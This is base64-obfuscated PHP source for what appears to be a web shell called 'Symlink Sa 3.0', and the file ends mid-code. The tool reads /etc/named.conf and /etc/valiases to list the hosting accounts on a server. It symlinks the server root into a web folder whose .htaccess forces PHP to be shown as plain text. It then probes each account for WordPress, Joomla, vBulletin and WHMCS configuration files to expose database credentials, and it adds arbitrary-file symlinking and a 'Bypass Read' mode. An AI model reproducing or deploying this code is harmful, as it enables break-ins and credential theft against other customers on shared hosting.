eval($GLOBALS['OOO0000O0']('JEdMT0JBTFNbJ0lJSUlJSUlsbGxsbCddPSdjb3B5JzskR0xPQkFMU1snSUlJSUlJSWxsbGxJJ109J2hlYWRlcic7JEdMT0JBTFNbJ0lJSUlJSUlsbGxJMSddPSdpc19kaXInOyRHTE9CQUxTWydJSUlJSUlJbGxsSUknXT0naW5pX2dldCc7JEdMT0JBTFNbJ0lJSUlJSUlsSTFsMSddPSdteXNxbF9xdWVyeSc7JEdMT0JBTFNbJ0lJSUlJSUlsSTFsSSddPSdteXNxbF9jb25uZWN0JzskR0xPQkFMU1snSUlJSUlJSWxJbGwxJ109J2VyZWcnOyRHTE9CQUxTWydJSUlJSUlJbElJSTEnXT0nZmNsb3NlJzskR0xPQkFMU1snSUlJSUlJSWxJSUlJJ109J3N0cmlwY3NsYXNoZXMnOyRHTE9CQUxTWydJSUlJSUlJSTExMUknXT0naGlnaGxpZ2h0X2ZpbGUnOyRHTE9CQUxTWydJSUlJSUlJSTExbDEnXT0nc2hvd19zb3VyY2UnOyRHTE9CQUxTWydJSUlJSUlJSTExbGwnXT0naHRtbGVudGl0aWVzJzskR0xPQkFMU1snSUlJSUlJSUkxMWxJJ109J2ZpbGVzaXplJzskR0xPQkFMU1snSUlJSUlJSUkxMUkxJ109J2ZyZWFkJzskR0xPQkFMU1snSUlJSUlJSUkxbGxJJ109J3ByZWdfbWF0Y2gnOyRHTE9CQUxTWydJSUlJSUlJSTFJMWwnXT0nc3RycG9zJzskR0xPQkFMU1snSUlJSUlJSUlJMTFJJ109J2ZpbGVvd25lcic7JEdMT0JBTFNbJ0lJSUlJSUlJSTFsMSddPSdwb3NpeF9nZXRwd3VpZCc7JEdMT0JBTFNbJ0lJSUlJSUlJSTFsSSddPSd0cmltJzskR0xPQkFMU1snSUlJSUlJSUlJMUlsJ109J3ByZWdfbWF0Y2hfYWxsJzskR0xPQkFMU1snSUlJSUlJSUlJMUlJJ109J2VyZWdpJzskR0xPQkFMU1snSUlJSUlJSUlJbDExJ109J2ZsdXNoJzskR0xPQkFMU1snSUlJSUlJSUlJbDFJJ109J2ZpbGUnOyRHTE9CQUxTWydJSUlJSUlJSUlsbGwnXT0naXNfZmlsZSc7JEdMT0JBTFNbJ0lJSUlJSUlJSWxsSSddPSdiYXNlbmFtZSc7JEdMT0JBTFNbJ0lJSUlJSUlJSWxJbCddPSdzeW1saW5rJzskR0xPQkFMU1snSUlJSUlJSUlJbElJJ109J2Z3cml0ZSc7JEdMT0JBTFNbJ0lJSUlJSUlJSUkxMSddPSdmb3Blbic7JEdMT0JBTFNbJ0lJSUlJSUlJSUlsbCddPSdjb3VudCc7JEdMT0JBTFNbJ0lJSUlJSUlJSUlsSSddPSdleHBsb2RlJzskR0xPQkFMU1snSUlJSUlJSUlJSUlJJ109J3NldF90aW1lX2xpbWl0Jzs=')); ?><?php 
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSUlJ')](0);
error_reporting(0);
$IIIIIIIIIIIl = $GLOBALS['OOO0000O0']('aHR0cDovLw==').$_SERVER[$GLOBALS['OOO0000O0']('U0VSVkVSX05BTUU=')].$_SERVER[$GLOBALS['OOO0000O0']('UkVRVUVTVF9VUkk=')];
$IIIIIIIIIII1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($GLOBALS['OOO0000O0']('Lw=='),$IIIIIIIIIIIl );
$IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxs')]($IIIIIIIIIII1)-1],$GLOBALS['OOO0000O0'](''),$IIIIIIIIIIIl );
$IIIIIIIIIIl1 = $GLOBALS['OOO0000O0']('ZnRwOi8v').$_SERVER[$GLOBALS['OOO0000O0']('U0VSVkVSX05BTUU=')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sLw==').$_SERVER[$GLOBALS['OOO0000O0']('UkVRVUVTVF9VUkk=')];
$IIIIIIIIIII1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxJ')]($GLOBALS['OOO0000O0']('Lw=='),$IIIIIIIIIIl1 );
$IIIIIIIIIIl1 =str_replace($IIIIIIIIIII1[$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSWxs')]($IIIIIIIIIII1)-1],$GLOBALS['OOO0000O0'](''),$IIIIIIIIIIl1 );
;echo $GLOBALS['OOO0000O0']('ICA8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBTdHJpY3QvL0VOIg0KICAgICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4NCg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KDQo8aGVhZD4NCjx0aXRsZT5TeW1saW5rX1NhIDMuMDwvdGl0bGU+DQoNCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoNCiAgaHRtbCxib2R5IHsNCiAgICAgbWFyZ2luOiAwOw0KICAgICBwYWRkaW5nOiAwOw0KICAgICBvdXRsaW5lOiAwOw0KfQ0KYXsNCg0KIGZvbnQtc2l6ZTogMTNweDsNCg0KfQ0KDQoNCmJvZHkgew0KICAgIGRpcmVjdGlvbjogbHRyOw0KICAgIGJhY2tncm91bmQtY29sb3I6I0Y0RjRGNDsNCgljb2xvcjogcmdiKDE1MywgMTUzLCAxNTMpOw0KICAgIHRleHQtYWxpZ246IGNlbnRlcg0KfQ0KDQoNCg0KaW5wdXQsdGV4dGFyZWEsc2VsZWN0ew0KZm9udC13ZWlnaHQ6IGJvbGQ7DQpjb2xvcjogIzAwMDAwMDsNCn0NCg0KaW5wdXQsdGV4dGFyZWEsc2VsZWN0OmhvdmVyew0KYm94LXNoYWRvdzogMHB4IDBweCA0cHggI0FBQUFBQTsNCn0NCg0KDQouaGVkciB7DQogIGZvbnQtZmFtaWx5OiBUYWhvbWEsIEFyaWFsLCBzYW5zLXNlcmlmICA7DQogIGZvbnQtc2l6ZTogMjJweDsNCg0KDQp9DQoNCi5jb250IGF7DQoNCiB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQogY29sb3I6cmdiKDE1MywgMTUzLCAxNTMpOw0KIGZvbnQtZmFtaWx5OiBUYWhvbWEsIEFyaWFsLCBzYW5zLXNlcmlmICA7DQogZm9udC1zaXplOiAxNnB4Ow0KIHRleHQtc2hhZG93OiAwcHggMHB4IDNweCA7DQp9DQoNCi5jb250IGE6aG92ZXJ7DQoNCg0KICBjb2xvcjogI0VFRUVFRSA7DQogIHRleHQtc2hhZG93OjBweCAwcHggM3B4ICMwMDAwMDAgOw0KDQoNCn0NCg0KLnRtcCB0ciB0ZHsNCg0KYm9yZGVyOiBzb2xpZCAxcHggI0JCQkJCQjsNCg0KcGFkZGluZzogMnB4IDsNCiAgZm9udC1zaXplOiAxM3B4Ow0KfQ0KDQoudG1wIHRyIHRkIGEgew0KICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQoNCg0KDQp9DQoNCi5mb3RlcnsNCiAgZm9udC1zaXplOiA5cHQ7DQogIGNvbG9yOiAjQUFBQUFBIDsNCiAgdGV4dC1hbGlnbjogY2VudGVyDQp9DQoNCi50bXAgdHIgdGQ6aG92ZXJ7DQoNCmJveC1zaGFkb3c6IDBweCAwcHggNHB4ICM4ODg4ODg7DQoNCn0NCi5mb3R7DQoNCmZvbnQtZmFtaWx5OlRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQoNCiAgZm9udC1zaXplOiAxMXB0Ow0KfQ0KLmZvciBhIDogaG92ZXJ7DQoNCnRleHQtc2hhZG93OiAwcHggMHB4IDFweCAjMzM2NkZGOw0KDQp9DQoNCg0KLmlyIHsNCiAgY29sb3I6ICNGRjAwMDA7DQp9DQoNCg0KDQo8L3N0eWxlPg0KDQo8L2hlYWQ+DQoNCjxib2R5Pg0KDQo8ZGl2IGNsYXNzPSdhbGwnPg0KDQoNCg==');
@mkdir($GLOBALS['OOO0000O0']('c3lt'),0777);
$IIIIIIIIII1I  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$IIIIIIIIII1l =@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')] ($GLOBALS['OOO0000O0']('c3ltLy5odGFjY2Vzcw=='),$GLOBALS['OOO0000O0']('dw=='));
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l ,$IIIIIIIIII1I);
@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbEls')]($GLOBALS['OOO0000O0']('Lw=='),$GLOBALS['OOO0000O0']('c3ltL3Jvb3Q='));
$IIIIIIIIIlI1 = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbGxJ')]('index.php');
echo $GLOBALS['OOO0000O0']('PGJyIC8+PGRpdiBjbGFzcz0iaGVkciI+IFN5bWxpbmsgU2EgMy4wIDxiciAvPjwvZGl2Pg==') ;
echo $GLOBALS['OOO0000O0']('PGJyIC8+PGRpdiBjbGFzcz0iaGVkciI+LTpbIFVzZXIgJiBEb21haW5zICYgU3ltbGluayBdOi08YnIgLz48YnIgLz48L2Rpdj4=') ;
echo $GLOBALS['OOO0000O0']('PGRpdiBjbGFzcz0iY29udCI+DQoNCls8YSBocmVmPSI/Ij4gSG9tZSA8L2E+XQ0KDQpbPGEgaHJlZj0iP3N3cz1zeW0iPiBVc2VyICYgRG9tYWlucyAmIFN5bWxpbmsgPC9hPl0NCg0KWzxhIGhyZWY9Ij9zd3M9c2VjIj4gRG9tYWlucyAmIFNjcmlwdCA8L2E+XQ0KDQpbIDxhIGhyZWY9Ij9zd3M9ZmlsZSI+IFN5bWxpbmsgRmlsZSA8L2E+XQ0KDQpbPGEgaHJlZj0iP3N3cz1wYXNzd2QiPiBTeW1saW5rIEJ5cGFzcyA8L2E+XQ0KDQo8YnIgLz48YnIgLz4NCg0KWyA8YSBocmVmPSI/c3dzPXJlYWQiPiBCeXBhc3MgUmVhZCA8L2E+XQ0KDQpbIDxhIGhyZWY9Ij9zd3M9am9vbWxhIj4gTWFzcyBKb29tbGEgPC9hPl0NCg0KWyA8YSBocmVmPSI/c3dzPXdwIj4gTWFzcyBXb3JkUHJlc3MgPC9hPl0NCg0KWyA8YSBocmVmPSI/c3dzPXZiIj4gTWFzcyB2QnVsbGV0aW4gPC9hPl0NCg0KWyA8YSBocmVmPSI/c3dzPWhlbHAiPiBIZWxwIDwvYT5dDQoNCjxiciAvPjxiciAvPjxiciAvPg0KDQoNCg0KDQoNCg0KPC9kaXY+');
if(isset($_REQUEST[$GLOBALS['OOO0000O0']('c3dz')]))
{
switch ($_REQUEST[$GLOBALS['OOO0000O0']('c3dz')])
{
case $GLOBALS['OOO0000O0']('c2Vj'):
if(!@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbGxs')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'))){
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('L2V0Yy9uYW1lZC5jb25m'));
}else{
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'));
}
if(!$IIIIIIIIIll1)
{
die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else
{
echo "<div class='tmp'>
<table align='center' width='40%'><td> Domains </td><td> Script </td>";
foreach($IIIIIIIIIll1 as $IIIIIIIIIl1l){
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUlJ')]($GLOBALS['OOO0000O0']('em9uZQ=='),$IIIIIIIIIl1l)){
@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUls')]($GLOBALS['OOO0000O0']('I3pvbmUgIiguKikiIw=='),$IIIIIIIIIl1l,$IIIIIIIII1I1);
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
if(@strlen($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1ll = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWwx')](@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMTFJ')]($GLOBALS['OOO0000O0']('L2V0Yy92YWxpYXNlcy8=').$IIIIIIIII1I1[1][0]));
$IIIIIIIII11l=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHA=');
$IIIIIIIII111=@get_headers($IIIIIIIII11l);
$wp=$IIIIIIIII111[0];
$IIIIIIIIlIIl=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocA==');
$IIIIIIIIlII1=@get_headers($IIIIIIIIlIIl);
$IIIIIIIIlIlI=$IIIIIIIIlII1[0];
$IIIIIIIIlIll=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhw');
$IIIIIIIIlIl1=@get_headers($IIIIIIIIlIll);
$IIIIIIIIlI1I=$IIIIIIIIlIl1[0];
$IIIIIIIIlI1l=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocA==');
$IIIIIIIIlI11=@get_headers($IIIIIIIIlI1l);
$IIIIIIIIllII=$IIIIIIIIlI11[0];
$IIIIIIIIllIl=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHA=');
$IIIIIIIIllI1=@get_headers($IIIIIIIIllIl);
$vb=$IIIIIIIIllI1[0];
$IIIIIIIIllll=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHA=');
$IIIIIIIIlll1=@get_headers($IIIIIIIIllll);
$IIIIIIIIll1I=$IIIIIIIIlll1[0];
$IIIIIIIIll1l=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHA=');
$IIIIIIIIll11=@get_headers($IIIIIIIIll1l);
$IIIIIIIIl1II=$IIIIIIIIll11[0];
$IIIIIIIIl1Il=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('cHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocA==');
$IIIIIIIIl1I1= @get_headers($IIIIIIIIl1Il);
$IIIIIIIIl1lI=$IIIIIIIIl1I1[0];
$IIIIIIIIl1ll=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHA=');
$IIIIIIIIl1I1= @get_headers($IIIIIIIIl1ll);
$IIIIIIIIl1l1=$IIIIIIIIl1I1[0];
$IIIIIIIIl11I=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocA==');
$IIIIIIIIl11l= @get_headers($IIIIIIIIl11I);
$IIIIIIIIl111=$IIIIIIIIl11l[0];
$IIIIIIII1III=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHA=');
$IIIIIIII1IIl= @get_headers($IIIIIIII1III);
$IIIIIIII1II1=$IIIIIIII1IIl[0];
$IIIIIIII1IlI=$IIIIIIIIIIIl.$GLOBALS['OOO0000O0']('L3N5bS9yb290L2hvbWUv').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')].$GLOBALS['OOO0000O0']('L3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocA==');
$IIIIIIII1Ill= @get_headers($IIIIIIII1IlI);
$IIIIIIII1Il1=$IIIIIIII1Ill[0];
$IIIIIIII1I1I = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw'));
$IIIIIIII1I11=$GLOBALS['OOO0000O0']('Jm5ic3A7');
if ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($wp,$GLOBALS['OOO0000O0']('MjAw')) == true )
{
$IIIIIIII1I11="<a href='".$IIIIIIIII11l."' target='_blank'>Wordpress</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIlIlI,$GLOBALS['OOO0000O0']('MjAw')) == true)
{
$IIIIIIII1I11="<a href='".$IIIIIIIIlIIl."' target='_blank'>Wordpress</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIlI1I,$GLOBALS['OOO0000O0']('MjAw'))  == true and $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIII1II1,$GLOBALS['OOO0000O0']('MjAw'))  == true )
{
$IIIIIIII1I11=" <a href='".$IIIIIIII1III."' target='_blank'>WHMCS</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIl1l1,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11 =" <a href='".$IIIIIIIIl1ll."' target='_blank'>WHMCS</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIl111,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11 =" <a href='".$IIIIIIIIl11I."' target='_blank'>WHMCS</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIlI1I,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11=" <a href='".$IIIIIIIIlIll."' target='_blank'>Joomla</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIllII,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11=" <a href='".$IIIIIIIIlI1l."' target='_blank'>Joomla</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($vb,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11=" <a href='".$IIIIIIIIllIl."' target='_blank'>vBulletin</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIll1I,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11=" <a href='".$IIIIIIIIllll."' target='_blank'>vBulletin</a>";
}
elseif ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxSTFs')]($IIIIIIIIl1II,$GLOBALS['OOO0000O0']('MjAw'))  == true)
{
$IIIIIIII1I11=" <a href='".$IIIIIIIIll1l."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIII1lII = $IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')] ;
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
echo $GLOBALS['OOO0000O0']('PHRyPjx0ZD48YSBocmVmPWh0dHA6Ly93d3cu').$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('Lz4=').$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('PC9hPjwvdGQ+DQo8dGQ+').$IIIIIIII1I11.$GLOBALS['OOO0000O0']('PC90ZD48L3RyPg==');$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
}
}
break;
case $GLOBALS['OOO0000O0']('c3lt'):
if(!$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbGxs')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'))){
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('L2V0Yy9uYW1lZC5jb25m'));
}else{
$IIIIIIIIIll1 = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDFJ')]($GLOBALS['OOO0000O0']('bmFtZWQudHh0'));
}
if(!$IIIIIIIIIll1)
{
die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
}
else
{
echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($IIIIIIIIIll1 as $IIIIIIIIIl1l){
if($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUlJ')]($GLOBALS['OOO0000O0']('em9uZQ=='),$IIIIIIIIIl1l)){
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMUls')]($GLOBALS['OOO0000O0']('I3pvbmUgIiguKikiIw=='),$IIIIIIIIIl1l,$IIIIIIIII1I1);
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
if(strlen($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWxJ')]($IIIIIIIII1I1[1][0])) >2){
$IIIIIIIII1ll = $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMWwx')](@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJMTFJ')]($GLOBALS['OOO0000O0']('L2V0Yy92YWxpYXNlcy8=').$IIIIIIIII1I1[1][0]));
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$IIIIIIII1lII = $IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')] ;
@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbEls')]($GLOBALS['OOO0000O0']('Lw=='),$GLOBALS['OOO0000O0']('c3ltL3Jvb3Q='));
$IIIIIIII1lII = $IIIIIIIII1I1[1][0];
$ir = $GLOBALS['OOO0000O0']('aXI=');
$il = $GLOBALS['OOO0000O0']('aWw=');
if ($GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxbGxJ')]("/.^$ir/",$IIIIIIIII1I1[1][0]) or $GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxbGxJ')]("/.^$il/",$IIIIIIIII1I1[1][0]) )
{
$IIIIIIII1lII = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('PC9kaXY+');
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$IIIIIIIII1I1[1][0].$GLOBALS['OOO0000O0']('Lz4=').$IIIIIIII1lII.$GLOBALS['OOO0000O0']('IDwvYT4gPC9kaXY+DQo8L3RkPg0KDQoNCjx0ZD4NCg==').$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')]."
</td>






<td>
<a href='sym/root/home/".$IIIIIIIII1ll[$GLOBALS['OOO0000O0']('bmFtZQ==')]."/public_html' target='_blank'>symlink </a>
</td>


</tr></div> ";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
}
}
}
}
break;
case $GLOBALS['OOO0000O0']('ZmlsZQ=='):
echo$GLOBALS['OOO0000O0']('DQpUaGUgZmlsZSBwYXRoIHRvIHN5bWxpbmsNCg0KPGJyIC8+PGJyIC8+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImZpbGUiIHZhbHVlPSIvaG9tZS91c2VyL3B1YmxpY19odG1sL2ZpbGUubmFtZSIgc2l6ZT0iNjAiLz48YnIgLz48YnIgLz4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJzeW1maWxlIiB2YWx1ZT0iZmlsZS5uYW1lX3N5bSAoIEV4LiA6OiByb3lhbGlzdGUudHh0ICkiIHNpemU9IjYwIi8+PGJyIC8+PGJyIC8+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic3ltbGluayIgbmFtZT0ic3ltbGluayIgLz4gPGJyIC8+PGJyIC8+DQoNCg0KDQo8L2Zvcm0+DQo=');
$IIIIIIII1lll = $_POST[$GLOBALS['OOO0000O0']('ZmlsZQ==')];
$symfile = $_POST[$GLOBALS['OOO0000O0']('c3ltZmlsZQ==')];
$symlink = $_POST[$GLOBALS['OOO0000O0']('c3ltbGluaw==')];
if ($symlink)
{
@mkdir($GLOBALS['OOO0000O0']('c3ltMQ=='),0777);
$IIIIIIII1l1l  = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n  AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n Require None \n Satisfy Any";
$IIIIIIIIII1l =@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')] ($GLOBALS['OOO0000O0']('c3ltMS8uaHRhY2Nlc3M='),$GLOBALS['OOO0000O0']('dw=='));
@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbElJ')]($IIIIIIIIII1l ,$IIIIIIII1l1l);
@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbEls')]("$IIIIIIII1lll","sym1/$symfile");
echo $GLOBALS['OOO0000O0']('PGJyIC8+PGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9InN5bTEv').$symfile.$GLOBALS['OOO0000O0']('IiA+').$symfile.$GLOBALS['OOO0000O0']('PC9hPg==');
}
break;
case $GLOBALS['OOO0000O0']('cmVhZA=='):
echo $GLOBALS['OOO0000O0']('cmVhZCAvZXRjL25hbWVkLmNvbmY=');
echo "<br /><br /><form method='post' action='?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJbDEx')]();
$file = $GLOBALS['OOO0000O0']('L2V0Yy9uYW1lZC5jb25m');
$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUlJSTEx')]($file,$GLOBALS['OOO0000O0']('cg=='));
if ($IIIIIIII11II){
$IIIIIIII11Il = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMUkx')]($IIIIIIII11II,@$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxJ')]($file));
echo $GLOBALS['OOO0000O0']('').$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWxs')]($IIIIIIII11Il).$GLOBALS['OOO0000O0']('');
}
else if (!$IIIIIIII11II)
{
$IIIIIIII11II = @$GLOBALS[$GLOBALS['OOO0000O0']('SUlJSUlJSUkxMWwx')]($file) ;
}
else if (!$IIIIIIII11II)
{
